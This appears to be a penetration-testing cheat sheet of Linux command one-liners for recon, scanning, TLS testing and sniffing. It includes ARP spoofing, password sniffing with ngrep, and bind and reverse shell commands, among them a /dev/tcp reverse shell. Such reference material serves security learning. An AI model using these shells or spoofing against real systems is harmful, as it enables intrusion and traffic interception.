# Basic Linux Hacking Tools

## Networking Tools

### Show IP Configuration

```bash
ip a l
```

### Change IP Address Configuration

```bash
ip link set dev eth0 down
macchanger -m <mac-address> eth0
ip link set dev eth0 up
```

### Set Static IP Address

```bash
ip addr add <ip-address>/24 dev eth0
```

### Perform DNS Lookup

```bash
dig <url>
```

### Reverse DNS Lookup

```bash
dig -x <ip>
```

---

## Information Gathering

### Find Domain/IP Owner or Contact Information

```bash
whois <url/ip>
```

### Retrieve Nameservers and Test Zone Transfer

```bash
dig <url> ns
dig <url> axfr @ns1.<url>
```

### Get Hostnames from Certificate Transparency Logs

- Visit: [crt.sh](https://crt.sh)
- Query: `%.<url>`

### Use Nmap Script to Discover Hosts

```bash
nmap -sn -Pn <url> --script hostmap-crtsh
```

### Enumerate Subdomains with Amass

```bash
amass enum -src -brute -min-for-recursive 2 -d <url>
```

---

## TCP Tools

### Listen on a TCP Port

```bash
ncat -l -p <port>
```

### Connect to a TCP Port

```bash
ncat <ip> <port>
```

---

## TLS Tools

### Create a Self-Signed Certificate

```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -nodes -subj "/CN=<url>/"
```

### Start a TLS Server

```bash
ncat --ssl -l -p <port> --ssl-cert cert.pem --ssl-key key.pem
```

### Connect to a TLS Service

```bash
ncat --ssl <ip> <port>
```

### Connect to a TLS Service Using OpenSSL

```bash
openssl s_client -connect <ip>:<port>
```

### Show Certificate Details

```bash
openssl s_client -connect <ip>:<port> | openssl x509 -text
```

### Test Server Certificate and Ciphers

```bash
sslyze --regular <ip>:<port>
```

### Set Up a TCP to TLS Proxy

```bash
socat TCP-LISTEN:<port>,fork,reuseaddr ssl:<url>:<port>
```

---

## HTTP Tools

### Start a Python Web Server

```bash
python3 -m http.server <port>
```

### Perform HTTP Request

```bash
curl http://<ip/url>
```

### Scan for Common Files and Configurations

```bash
nikto -host <url>
```

### Enumerate Directories and Filenames

```bash
gobuster dir -u <url> -w <wordlist>
```

---

## Sniffing Tools

### Perform ARP Spoofing

```bash
arpspoof -t <ip1> <ip2>
```

### Use a Graphical Sniffer Tool

```bash
ettercap -G
```

### Display ARP Cache

```bash
ip neigh
```

### Clear ARP Cache

```bash
ip neigh flush all
```

### Capture Network Traffic

```bash
tcpdump [options] [filters]
```

### Capture Traffic on a Remote Host via SSH

```bash
ssh <ip> tcpdump -w- port not ssh | wireshark -k -i -
```

### Search Network Traffic for Keywords

```bash
ngrep -i password
```

### Display HTTP GET Requests

```bash
urlsnarf
```

### Display Transmitted Images

```bash
driftnet
```

---

## Network Scanning

### Perform an ARP Scan

```bash
nmap -n -sn -PR <ip-range>
```

### Perform Reverse DNS Lookup for IP Range

```bash
nmap -sL <ip-range>
```

### Host Discovery with Nmap

```bash
nmap -sP -n <ip-range>
```

### TCP SYN Scan

```bash
nmap -Pn -n -sS -p 22,25,80,443,8080 <ip-range>
```

### List Available Nmap Scripts

```bash
ls /usr/share/nmap/scripts
```

### Scan for EternalBlue Vulnerability

```bash
nmap -n -Pn -p 445 --script smb-vuln-ms17-010 <ip>
```

### Scan for Vulnerabilities

```bash
nmap -n -Pn --script "vuln and safe" <ip>
```

### Performance Testing with Nmap

```bash
nmap -n -Pn --min-rate 20000 <ip>
```

### Fast Scan Using Masscan

```bash
masscan -p80,8000:8100 --rate 20000 <ip-range>
```

---

## Shells

### Start a Bind Shell

```bash
ncat -l -p <port> -e /bin/bash
```

### Connect to a Bind Shell

```bash
ncat <ip> <port>
```

### Listen for a Reverse Shell

```bash
ncat -l -p <port>
```

### Start a Reverse Shell

```bash
ncat -e /bin/bash <ip> <port>
```

### Start Reverse Shell with Bash Only

```bash
bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

### Upgrade to a Pseudo-Terminal

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
